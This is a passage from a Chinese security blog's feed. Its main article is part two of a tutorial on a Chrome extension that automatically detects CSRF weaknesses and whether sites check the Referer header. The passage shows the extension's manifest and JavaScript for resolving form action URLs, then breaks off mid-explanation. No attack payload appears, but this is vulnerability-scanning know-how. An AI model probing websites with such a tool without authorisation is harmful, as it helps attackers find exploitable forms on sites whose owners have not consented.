&lt;p&gt;Google hosts：&lt;a href=&quot;https://laod.org/hosts/2016-google-hosts.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://laod.org/hosts/2016-google-hosts.html&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&quot;作者信息：&quot;&gt;&lt;a href=&quot;#作者信息：&quot; class=&quot;headerlink&quot; title=&quot;作者信息：&quot;&gt;&lt;/a&gt;&lt;code&gt;作者信息：&lt;/code&gt;&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;Author:Black-Hole&lt;/p&gt;
&lt;p&gt;Blog:&lt;a href=&quot;http://bugs.cc/&quot;&gt;http://bugs.cc/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;github:&lt;a href=&quot;https://github.com/BlackHole1/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/BlackHole1/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Twitter:&lt;a href=&quot;https://twitter.com/Free_BlackHole&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://twitter.com/Free_BlackHole&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Email:158blackhole@gmail.com&lt;/p&gt;
&lt;/blockquote&gt;
</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;最后更新时间-2016-8-15-22-40-48&quot;&gt;&lt;a href=&quot;#最后更新时间-2016-8-15-22-40-48&quot; class=&quot;headerlink&quot; title=&quot;最后更新时间:2016/8/15 22:40:48&quot;&gt;&lt;/a&gt;最后更新时间:2016/8/15 22:40:48&lt;/h3&gt;&lt;hr&gt;
&lt;h4 id=&quot;UI美工：&quot;&gt;&lt;a href=&quot;#UI美工：&quot; class=&quot;headerlink&quot; title=&quot;UI美工：&quot;&gt;&lt;/a&gt;&lt;code&gt;UI美工：&lt;/code&gt;&lt;/h4&gt;&lt;p&gt;WEB安全色 ： &lt;a href=&quot;http://www.bootcss.com/p/websafecolors/&quot;&gt;http://www.bootcss.com/p/websafecolors/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;UI设计网  ： &lt;a href=&quot;http://www.uisheji.com/&quot;&gt;http://www.uisheji.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;阿里巴巴矢量图标库：&lt;a href=&quot;http://www.iconfont.cn/&quot;&gt;http://www.iconfont.cn/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&quot;前端开发-JavaScript-And-CSS-：&quot;&gt;&lt;a href=&quot;#前端开发-JavaScript-And-CSS-：&quot; class=&quot;headerlink&quot; title=&quot;前端开发(JavaScript And CSS)：&quot;&gt;&lt;/a&gt;&lt;code&gt;前端开发(JavaScript And CSS)：&lt;/code&gt;&lt;/h4&gt;
    
    </summary>
    
    
      <category term="Other" scheme="http://bugs.cc/tags/Other/"/>
    
  </entry>
  
  <entry>
    <title>自动化检测CSRF(第二篇)</title>
    <link href="http://bugs.cc/2016/06/23/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%A3%80%E6%B5%8BCSRF%EF%BC%88%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%89/"/>
    <id>http://bugs.cc/2016/06/23/自动化检测CSRF（第二章）/</id>
    <published>2016-06-23T15:49:34.000Z</published>
    <updated>2016-08-23T16:02:32.189Z</updated>
    
    <content type="html">&lt;h4 id=&quot;0x00-前言：&quot;&gt;&lt;a href=&quot;#0x00-前言：&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言：&quot;&gt;&lt;/a&gt;0x00 前言：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;上一篇只是大致说明整个思路和流程。本篇就详细说说如何检测CSRF。为什么不在上一篇中放出插件呢。是因为误报率确实是比较多，而且无法检测Referer。而本章，重点就说明“如何检测对方是否开启了Referer检测机制”。在我的认知范围内，这是首款检测Referer的工具(不知廉耻的笑了)。今天发现腾讯在2013年就做了类似的&lt;a href=&quot;https://security.tencent.com/index.php/blog/msg/24&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;产品&lt;/a&gt; (这就尴尬了..)，不过还好。而且思路和实现方法有所区别。本章说检测Referer，第三章说检测token机制的强化,让检测token的成功率达到80~90%以上(其实就是写第二篇的时候，忘记写了。推到第三章了….)。而且这些是腾讯产品所没有的撒。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;0x01一些小的变化：&quot;&gt;&lt;a href=&quot;#0x01一些小的变化：&quot; class=&quot;headerlink&quot; title=&quot;0x01一些小的变化：&quot;&gt;&lt;/a&gt;0x01一些小的变化：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;之前的黑白名单列表&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; placeholderFilterKeyword = [&lt;span class=&quot;string&quot;&gt;&#39;跳&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;搜&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;查&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;找&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;登陆&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;注册&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;search&#39;&lt;/span&gt;];  &lt;span class=&quot;comment&quot;&gt;//无用表单黑名单，用于验证这个form表单有没有用（针对input验证）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; actionFilterKeyword = [&lt;span class=&quot;string&quot;&gt;&#39;search&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;find&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;login&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;reg&#39;&lt;/span&gt;];   &lt;span class=&quot;comment&quot;&gt;//无用表单黑名单，用于验证这个form表单有没有用（针对form表单验证）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;现在的黑白名单列表：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; placeholderFilterKeyword = [&lt;span class=&quot;string&quot;&gt;&#39;跳&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;搜&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;查&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;找&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;登陆&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;注册&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;search&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; actionFilterKeyword = [&lt;span class=&quot;string&quot;&gt;&#39;search&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;find&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;login&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;reg&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;baidu.com&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;google.com&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;so.com&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;bing.com&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;soso.com&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;sogou.com&quot;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;此处的代码，决定了整体插件检测时的误报率大体走向。你也可以自己修改来达到自我感觉不错的地步。&lt;/p&gt;
&lt;p&gt;现在的初始化变量：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; actionCache,actionPath;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; actionvParameter = &lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; ajaxParameter = &lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&quot;0x02：插件的整体框架&quot;&gt;&lt;a href=&quot;#0x02：插件的整体框架&quot; class=&quot;headerlink&quot; title=&quot;0x02：插件的整体框架&quot;&gt;&lt;/a&gt;0x02：插件的整体框架&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;因为Maxthon浏览器的API实在是太少，没有这些API我无法进行Referer检测，于是，检测CSRF插件，就不写Maxthon的插件了，下面是Chrome插件的框架：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/CSRF2/img/1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;icons 是存放插件图标的地方，我比较懒，直接使用AutoFindXSS插件的图标。&lt;/p&gt;
&lt;p&gt;background.html 是为了让我们修改插件的作用域，让我们可控，可以在Chrome的API中使用&lt;code&gt;jquery插件&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;background.js 这里我们把它理解为后端程序，类似于服务端的存在。用于处理&lt;code&gt;base.js&lt;/code&gt;文件的数据&lt;/p&gt;
&lt;p&gt;base.js 会在网站加载完成后调用。在&lt;code&gt;检测Referer&lt;/code&gt;的时候，把数据传给&lt;code&gt;background.js&lt;/code&gt;文件&lt;/p&gt;
&lt;p&gt;manifest.json Chrome插件的核心文件，用于配置插件参数。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这里我先给大家看一下manifest.json文件的内容：&lt;br&gt;&lt;figure class=&quot;highlight json&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;attr&quot;&gt;&quot;background&quot;&lt;/span&gt;: &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;page&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;background.html&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;persistent&quot;&lt;/span&gt;: &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;attr&quot;&gt;&quot;name&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;AutoFindCSRF&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;attr&quot;&gt;&quot;version&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;1.0.0&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;attr&quot;&gt;&quot;manifest_version&quot;&lt;/span&gt;: &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;attr&quot;&gt;&quot;description&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;CSRF[by:Black-Hole&amp;amp;158099591@qq.com]&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;attr&quot;&gt;&quot;content_security_policy&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;script-src &#39;self&#39; &#39;unsafe-eval&#39;; object-src &#39;self&#39;&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;attr&quot;&gt;&quot;permissions&quot;&lt;/span&gt;: [     &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;all_urls&amp;gt;&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;tabs&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  ],&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;attr&quot;&gt;&quot;icons&quot;&lt;/span&gt;:&amp;#123;&lt;span class=&quot;attr&quot;&gt;&quot;16&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;icons/icon_16.png&quot;&lt;/span&gt;,&lt;span class=&quot;attr&quot;&gt;&quot;48&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;icons/icon_48.png&quot;&lt;/span&gt;,&lt;span class=&quot;attr&quot;&gt;&quot;128&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;icons/icon_128.png&quot;&lt;/span&gt;&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;attr&quot;&gt;&quot;content_scripts&quot;&lt;/span&gt;: [&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;matches&quot;&lt;/span&gt;: [&lt;span class=&quot;string&quot;&gt;&quot;*://*/*&quot;&lt;/span&gt;],&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;js&quot;&lt;/span&gt;: [&lt;span class=&quot;string&quot;&gt;&quot;jquery.js&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;base.js&quot;&lt;/span&gt;],&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;run_at&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;document_end&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;content_security_policy 简称CSP，用户限制插件的安全性&lt;/p&gt;
&lt;p&gt;permissions 是插件向Chrome申请的权限。&lt;/p&gt;
&lt;p&gt;content_scripts 意思是，在任何协议下，当网站加载完成后，都会运行jquery.js和base.js文件。JavaScript this指向的是当前网页&lt;/p&gt;
&lt;p&gt;background JavaScript this指向的是插件，用户处理base.js和background.js通信的存在&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;而&lt;a href=&quot;http://www.freebuf.com/articles/web/107207.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;上一篇文章&lt;/a&gt;的JavaScript代码，都存放在base.js里，待会说“检测Referer机制”时，也是写在这个文件里。&lt;/p&gt;
&lt;h4 id=&quot;0x03：检测对方是否开启了Referer检测机制&quot;&gt;&lt;a href=&quot;#0x03：检测对方是否开启了Referer检测机制&quot; class=&quot;headerlink&quot; title=&quot;0x03：检测对方是否开启了Referer检测机制&quot;&gt;&lt;/a&gt;0x03：检测对方是否开启了Referer检测机制&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;首先为了下面程序的简洁，先把当前表单的action地址赋值给一个变量：&lt;br&gt;&lt;code&gt;actionCache = formDom.attr(&amp;quot;action&amp;quot;);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;然后匹配action地址。为什么要匹配action地址呢，因为action分为以下几种情况：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;#test&lt;/p&gt;
&lt;p&gt;./test.php &amp;amp;&amp;amp; ./test(处理方式一样)&lt;/p&gt;
&lt;p&gt;/test.php?a=11&lt;/p&gt;
&lt;p&gt;test.php&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://baidu.com/?s=&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://baidu.com/?s=&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这里我们使用switch来实现匹配，代码如下：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;switch&lt;/span&gt;(actionCache[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;])&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;#&quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        actionPath = location.href + actionCache;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        actionPath = location.origin + actionCache;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;.&quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(actionCache.indexOf(&lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt;) != &lt;span class=&quot;string&quot;&gt;&quot;-1&quot;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            actionvParameter = &lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt; + actionCache.split(&lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt;)[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            actionCache = actionCache.slice(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,actionCache.indexOf(&lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(location.href.split(&lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt;).pop().split(&lt;span class=&quot;string&quot;&gt;&quot;.&quot;&lt;/span&gt;).length == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            actionPath = location.href + actionCache.substr(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,actionCache.length&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;) + actionvParameter;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            actionPath = location.href.substr(location.href,location.href.lastIndexOf(location.href.split(&lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt;).pop())) + actionCache.substring(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,actionCache.length) + actionvParameter;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;default&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(location.protocol == &lt;span class=&quot;string&quot;&gt;&quot;http:&quot;&lt;/span&gt; || location.protocol == &lt;span class=&quot;string&quot;&gt;&quot;https:&quot;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            actionPath = location.href;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(location.href.split(&lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt;).pop().split(&lt;span class=&quot;string&quot;&gt;&quot;.&quot;&lt;/span&gt;).length == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            actionPath = location.href + &lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt; + actionCache;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            actionPath = location.href.substr(location.href,location.href.lastIndexOf(location.href.split(&lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt;).pop())) + actionCache;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;当action地址的第一个值是&lt;code&gt;#&lt;/code&gt;时，直接使用&lt;code&gt;location.href + actionCache;&lt;/code&gt;拼接。&lt;/p&gt;
